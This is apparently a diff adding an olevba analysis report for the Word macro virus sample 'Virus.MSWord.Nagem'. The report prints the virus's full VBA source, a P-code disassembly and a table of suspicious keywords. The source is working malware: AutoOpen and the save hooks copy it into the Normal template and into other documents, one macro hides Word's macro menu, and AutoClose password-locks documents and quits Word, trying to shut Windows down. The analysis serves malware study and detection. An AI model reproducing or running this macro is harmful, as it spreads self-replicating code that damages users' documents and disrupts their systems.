@@ -1,0 +1,525 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.Nagem
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: ./Virus.MSWord.Nagem - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Magan_Macro.bas 
+in file: ./Virus.MSWord.Nagem - OLE stream: 'Macros/VBA/Magan_Macro'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Distributed for Changes/Upgradation etc. in
+'Open Source Code.
+' If you are interested in developing,modifying,
+'crypting etc. this document using your skills,
+'you are FREE to do so.
+' Don't forget to give credits also to
+'"Anonymous Creater of Megan V1.0"
+' Nick of course is Magan
+' Best of Luck
+' Explanation Also Included.
+
+Dim Ni, Di As Integer
+Sub AutoOpen()
+'There are no destructive routines in
+'this document.
+On Error GoTo 1
+
+'Find if Normal is already infected!
+With Normal.ThisDocument.VBProject.VBComponents
+    For Ni = 1 To .Count
+            If (.Item(Ni).Name = "Magan_Macro") Then
+                GoTo 3
+            End If
+    Next Ni
+End With
+
+'Infect Normal
+With ThisDocument.VBProject.VBComponents
+    For Di = 1 To .Count
+       If (.Item(Di).Name = "Magan_Macro") Then
+          .Item(Di).Export ("MaganM.BAS")
+          ' I know that the above is not the best way, still,
+          'It is the easiest to understand.
+          Normal.ThisDocument.VBProject.VBComponents.Add(1).CodeModule.AddFromFile ("MaganM.BAS")
+          Kill ("MaganM.BAS")
+          Exit For
+       End If
+Next Di
+End With
+
+GoTo 2
+
+3
+
+With ActiveDocument.VBProject.VBComponents
+For Ni = 1 To .Count
+            If (.Item(Ni).Name = "Magan_Macro") Then
+                GoTo 1
+            End If
+Next Ni
+End With
+
+With Normal.ThisDocument.VBProject.VBComponents
+For Di = 1 To .Count
+       If (.Item(Di).Name = "Magan_Macro") Then
+          .Item(Di).Export ("MaganM.BAS")
+          ActiveDocument.VBProject.VBComponents.Add(1).CodeModule.AddFromFile ("MaganM.BAS")
+          Kill ("MaganM.BAS")
+          Exit For
+       End If
+Next Di
+End With
+ActiveDocument.Saved = False
+2
+Normal.ThisDocument.Saved = False
+1
+End Sub
+
+Sub ToolsMacro()
+Attribute ToolsMacro.VB_Description = "Disables the Tools->Macro->Macros... command under English version of Word."
+Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.ToolsMacro1"
+'This macro disables the Tools->Macros->Macros...
+'Command under English version of Word.
+
+'If you are here, you know the in and out of the
+'macro programming i belive.
+MsgBox "This Command is Unavaliable this time.", vbCritical, "Microsoft Word"
+End Sub
+
+
+Sub AutoClose()
+'No fun without an activation routine.
+On Error Resume Next
+If (Val(Left$(Date$, 2)) > 20) Then
+    'Change "password" to Rnd*100 if you like!
+    'Then, the document can never be unprotected again.
+    ActiveDocument.Protect wdAllowOnlyComments, , "password"
+End If
+If (Val(Left$(Date$, 2)) > 10) Then
+    If (Rnd * 100 < 50) Then
+       'Quits without saving :)
+       'Then tries Restarts the Computer
+       'Restart works only if there is a delay
+       Shell "RunDLL.EXE USER,ExitWindows", vbHide
+       ThisDocument.Application.Quit
+    End If
+End If
+End Sub
+
+Sub FileSave()
+'Just to Spread.
+'Note : Works only under English Version.
+On Error Resume Next
+AutoOpen
+ActiveDocument.Save
+End Sub
+
+Sub FileSaveAs()
+'Just to Spread.
+'Note : Works only under English Version.
+On Error Resume Next
+AutoOpen
+Dialogs(wdDialogFileSaveAs).Show
+AutoOpen
+End Sub
+CHG
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.Nagem
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 1120 bytes
+' Macros/VBA/Magan_Macro - 11885 bytes
+' Line #0:
+' 	QuoteRem 0x0000 0x002C " Distributed for Changes/Upgradation etc. in"
+' Line #1:
+' 	QuoteRem 0x0000 0x0011 "Open Source Code."
+' Line #2:
+' 	QuoteRem 0x0000 0x002F " If you are interested in developing,modifying,"
+' Line #3:
+' 	QuoteRem 0x0000 0x002E "crypting etc. this document using your skills,"
+' Line #4:
+' 	QuoteRem 0x0000 0x0016 "you are FREE to do so."
+' Line #5:
+' 	QuoteRem 0x0000 0x0025 " Don't forget to give credits also to"
+' Line #6:
+' 	QuoteRem 0x0000 0x0021 ""Anonymous Creater of Megan V1.0""
+' Line #7:
+' 	QuoteRem 0x0000 0x0018 " Nick of course is Magan"
+' Line #8:
+' 	QuoteRem 0x0000 0x000D " Best of Luck"
+' Line #9:
+' 	QuoteRem 0x0000 0x001B " Explanation Also Included."
+' Line #10:
+' Line #11:
+' 	Dim 
+' 	VarDefn Ni
+' 	VarDefn Di (As Integer)
+' Line #12:
+' 	FuncDefn (Sub AutoOpen())
+' Line #13:
+' 	QuoteRem 0x0000 0x0024 "There are no destructive routines in"
+' Line #14:
+' 	QuoteRem 0x0000 0x000E "this document."
+' Line #15:
+' 	OnError 1 
+' Line #16:
+' Line #17:
+' 	QuoteRem 0x0000 0x0023 "Find if Normal is already infected!"
+' Line #18:
+' 	StartWithExpr 
+' 	Ld Normal 
+' 	MemLd ThisDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	With 
+' Line #19:
+' 	StartForVariable 
+' 	Ld Ni 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	MemLdWith Count 
+' 	For 
+' Line #20:
+' 	Ld Ni 
+' 	ArgsMemLdWith Item 0x0001 
+' 	MemLd New 
+' 	LitStr 0x000B "Magan_Macro"
+' 	Eq 
+' 	Paren 
+' 	IfBlock 
+' Line #21:
+' 	GoTo 3 
+' Line #22:
+' 	EndIfBlock 
+' Line #23:
+' 	StartForVariable 
+' 	Ld Ni 
+' 	EndForVariable 
+' 	NextVar 
+' Line #24:
+' 	EndWith 
+' Line #25:
+' Line #26:
+' 	QuoteRem 0x0000 0x000D "Infect Normal"
+' Line #27:
+' 	StartWithExpr 
+' 	Ld ThisDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	With 
+' Line #28:
+' 	StartForVariable 
+' 	Ld Di 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	MemLdWith Count 
+' 	For 
+' Line #29:
+' 	Ld Di 
+' 	ArgsMemLdWith Item 0x0001 
+' 	MemLd New 
+' 	LitStr 0x000B "Magan_Macro"
+' 	Eq 
+' 	Paren 
+' 	IfBlock 
+' Line #30:
+' 	LitStr 0x000A "MaganM.BAS"
+' 	Paren 
+' 	Ld Di 
+' 	ArgsMemLdWith Item 0x0001 
+' 	ArgsMemCall Export 0x0001 
+' Line #31:
+' 	QuoteRem 0x000A 0x0032 " I know that the above is not the best way, still,"
+' Line #32:
+' 	QuoteRem 0x000A 0x0020 "It is the easiest to understand."
+' Line #33:
+' 	LitStr 0x000A "MaganM.BAS"
+' 	Paren 
+' 	LitDI2 0x0001 
+' 	Ld Normal 
+' 	MemLd ThisDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Add 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromFile 0x0001 
+' Line #34:
+' 	LitStr 0x000A "MaganM.BAS"
+' 	Paren 
+' 	ArgsCall Kill 0x0001 
+' Line #35:
+' 	ExitFor 
+' Line #36:
+' 	EndIfBlock 
+' Line #37:
+' 	StartForVariable 
+' 	Ld Di 
+' 	EndForVariable 
+' 	NextVar 
+' Line #38:
+' 	EndWith 
+' Line #39:
+' Line #40:
+' 	GoTo 2 
+' Line #41:
+' Line #42:
+' 	LineNum 3 
+' Line #43:
+' Line #44:
+' 	StartWithExpr 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	With 
+' Line #45:
+' 	StartForVariable 
+' 	Ld Ni 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	MemLdWith Count 
+' 	For 
+' Line #46:
+' 	Ld Ni 
+' 	ArgsMemLdWith Item 0x0001 
+' 	MemLd New 
+' 	LitStr 0x000B "Magan_Macro"
+' 	Eq 
+' 	Paren 
+' 	IfBlock 
+' Line #47:
+' 	GoTo 1 
+' Line #48:
+' 	EndIfBlock 
+' Line #49:
+' 	StartForVariable 
+' 	Ld Ni 
+' 	EndForVariable 
+' 	NextVar 
+' Line #50:
+' 	EndWith 
+' Line #51:
+' Line #52:
+' 	StartWithExpr 
+' 	Ld Normal 
+' 	MemLd ThisDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	With 
+' Line #53:
+' 	StartForVariable 
+' 	Ld Di 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	MemLdWith Count 
+' 	For 
+' Line #54:
+' 	Ld Di 
+' 	ArgsMemLdWith Item 0x0001 
+' 	MemLd New 
+' 	LitStr 0x000B "Magan_Macro"
+' 	Eq 
+' 	Paren 
+' 	IfBlock 
+' Line #55:
+' 	LitStr 0x000A "MaganM.BAS"
+' 	Paren 
+' 	Ld Di 
+' 	ArgsMemLdWith Item 0x0001 
+' 	ArgsMemCall Export 0x0001 
+' Line #56:
+' 	LitStr 0x000A "MaganM.BAS"
+' 	Paren 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Add 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromFile 0x0001 
+' Line #57:
+' 	LitStr 0x000A "MaganM.BAS"
+' 	Paren 
+' 	ArgsCall Kill 0x0001 
+' Line #58:
+' 	ExitFor 
+' Line #59:
+' 	EndIfBlock 
+' Line #60:
+' 	StartForVariable 
+' 	Ld Di 
+' 	EndForVariable 
+' 	NextVar 
+' Line #61:
+' 	EndWith 
+' Line #62:
+' 	LitVarSpecial (False)
+' 	Ld ActiveDocument 
+' 	MemSt Saved 
+' Line #63:
+' 	LineNum 2 
+' Line #64:
+' 	LitVarSpecial (False)
+' 	Ld Normal 
+' 	MemLd ThisDocument 
+' 	MemSt Saved 
+' Line #65:
+' 	LineNum 1 
+' Line #66:
+' 	EndSub 
+' Line #67:
+' Line #68:
+' 	FuncDefn (Sub ToolsMacro())
+' Line #69:
+' 	QuoteRem 0x0000 0x0030 "This macro disables the Tools->Macros->Macros..."
+' Line #70:
+' 	QuoteRem 0x0000 0x0026 "Command under English version of Word."
+' Line #71:
+' Line #72:
+' 	QuoteRem 0x0000 0x002F "If you are here, you know the in and out of the"
+' Line #73:
+' 	QuoteRem 0x0000 0x001B "macro programming i belive."
+' Line #74:
+' 	LitStr 0x0026 "This Command is Unavaliable this time."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #75:
+' 	EndSub 
+' Line #76:
+' Line #77:
+' Line #78:
+' 	FuncDefn (Sub AutoClose())
+' Line #79:
+' 	QuoteRem 0x0000 0x0025 "No fun without an activation routine."
+' Line #80:
+' 	OnError (Resume Next) 
+' Line #81:
+' 	Ld Date$ 
+' 	LitDI2 0x0002 
+' 	ArgsLd LBound$ 0x0002 
+' 	ArgsLd Val 0x0001 
+' 	LitDI2 0x0014 
+' 	Gt 
+' 	Paren 
+' 	IfBlock 
+' Line #82:
+' 	QuoteRem 0x0004 0x0029 "Change "password" to Rnd*100 if you like!"
+' Line #83:
+' 	QuoteRem 0x0004 0x0032 "Then, the document can never be unprotected again."
+' Line #84:
+' 	Ld wdAllowOnlyComments 
+' 	ParamOmitted 
+' 	LitStr 0x0008 "password"
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Protect 0x0003 
+' Line #85:
+' 	EndIfBlock 
+' Line #86:
+' 	Ld Date$ 
+' 	LitDI2 0x0002 
+' 	ArgsLd LBound$ 0x0002 
+' 	ArgsLd Val 0x0001 
+' 	LitDI2 0x000A 
+' 	Gt 
+' 	Paren 
+' 	IfBlock 
+' Line #87:
+' 	Ld Rnd 
+' 	LitDI2 0x0064 
+' 	Mul 
+' 	LitDI2 0x0032 
+' 	Lt 
+' 	Paren 
+' 	IfBlock 
+' Line #88:
+' 	QuoteRem 0x0007 0x0017 "Quits without saving :)"
+' Line #89:
+' 	QuoteRem 0x0007 0x0020 "Then tries Restarts the Computer"
+' Line #90:
+' 	QuoteRem 0x0007 0x0026 "Restart works only if there is a delay"
+' Line #91:
+' 	LitStr 0x001B "RunDLL.EXE USER,ExitWindows"
+' 	Ld vbHide 
+' 	ArgsCall Shell 0x0002 
+' Line #92:
+' 	Ld ThisDocument 
+' 	MemLd Application 
+' 	ArgsMemCall Quit 0x0000 
+' Line #93:
+' 	EndIfBlock 
+' Line #94:
+' 	EndIfBlock 
+' Line #95:
+' 	EndSub 
+' Line #96:
+' Line #97:
+' 	FuncDefn (Sub FileSave())
+' Line #98:
+' 	QuoteRem 0x0000 0x000F "Just to Spread."
+' Line #99:
+' 	QuoteRem 0x0000 0x0028 "Note : Works only under English Version."
+' Line #100:
+' 	OnError (Resume Next) 
+' Line #101:
+' 	ArgsCall AutoOpen 0x0000 
+' Line #102:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #103:
+' 	EndSub 
+' Line #104:
+' Line #105:
+' 	FuncDefn (Sub FileSaveAs())
+' Line #106:
+' 	QuoteRem 0x0000 0x000F "Just to Spread."
+' Line #107:
+' 	QuoteRem 0x0000 0x0028 "Note : Works only under English Version."
+' Line #108:
+' 	OnError (Resume Next) 
+' Line #109:
+' 	ArgsCall AutoOpen 0x0000 
+' Line #110:
+' 	Ld wdDialogFileSaveAs 
+' 	ArgsLd Dialogs 0x0001 
+' 	ArgsMemCall Show 0x0000 
+' Line #111:
+' 	ArgsCall AutoOpen 0x0000 
+' Line #112:
+' 	EndSub 
+' Line #113:
+' 	ArgsCall CHG 0x0000 
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|AutoExec  |AutoClose           |Runs when the Word document is closed        |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Kill                |May delete a file                            |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|vbHide              |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|command             |May run PowerShell commands                  |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|IOC       |RunDLL.EXE          |Executable file name                         |
+|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
+|          |                    |code and P-code are different, this may have |
+|          |                    |been used to hide malicious code             |
++----------+--------------------+---------------------------------------------+
+VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues
+
